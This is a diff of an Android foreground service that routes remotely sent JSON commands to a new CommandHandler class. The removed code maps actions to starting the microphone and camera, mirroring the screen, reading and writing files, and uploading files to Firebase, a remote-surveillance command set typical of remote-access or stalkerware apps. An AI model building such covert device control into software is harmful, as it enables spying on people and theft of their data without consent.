@@ -194,66 +194,15 @@ public class MyForegroundService extends Service {
         }
     }
 
+    private CommandHandler commandHandler;
+
     private void handleCommand(String command) {
         try {
-            JSONObject cmdObj = new JSONObject(command);
-            String action = cmdObj.getString("action");
-            JSONObject params = cmdObj.optJSONObject("params");
-
-            switch (action) {
-                case "START_MIC":
-                    startRecording();
-                    break;
-                case "STOP_MIC":
-                    stopRecording();
-                    break;
-                case "START_CAMERA":
-                    startCameraStream();
-                    break;
-                case "STOP_CAMERA":
-                    stopCameraStream();
-                    break;
-                case "START_SCREEN":
-                    if (params != null && params.has("resultCode") && params.has("data")) {
-                        int resultCode = params.getInt("resultCode");
-                        Intent data = Intent.parseUri(params.getString("data"), 0);
-                        startScreenMirroring(resultCode, data);
-                    } else {
-                        sendCommandResponse("START_SCREEN", "error", "Missing parameters");
-                    }
-                    break;
-                case "STOP_SCREEN":
-                    stopScreenMirroring();
-                    break;
-                case "LIST_FILES":
-                    String path = params != null ? params.optString("path", "/") : "/";
-                    listFiles(path);
-                    break;
-                case "READ_FILE":
-                    if (params != null && params.has("path")) {
-                        readFile(params.getString("path"));
-                    } else {
-                        sendCommandResponse("READ_FILE", "error", "Missing path parameter");
-                    }
-                    break;
-                case "WRITE_FILE":
-                    if (params != null && params.has("path") && params.has("content")) {
-                        writeFile(params.getString("path"), params.getString("content"));
-                    } else {
-                        sendCommandResponse("WRITE_FILE", "error", "Missing parameters");
-                    }
-                    break;
-                case "DOWNLOAD_FILE":
-                    if (params != null && params.has("path")) {
-                        uploadFileToFirebase(params.getString("path"));
-                    } else {
-                        sendCommandResponse("DOWNLOAD_FILE", "error", "Missing path parameter");
-                    }
-                    break;
-                default:
-                    sendCommandResponse(action, "error", "Unknown command");
-                    break;
+            // Use the enhanced CommandHandler for all commands
+            if (commandHandler == null) {
+                commandHandler = new CommandHandler(this, userId);
             }
+            commandHandler.handleCommand(command);
         } catch (Exception e) {
             Log.e(TAG, "Error handling command", e);
             sendCommandResponse("ERROR", "error", e.getMessage());
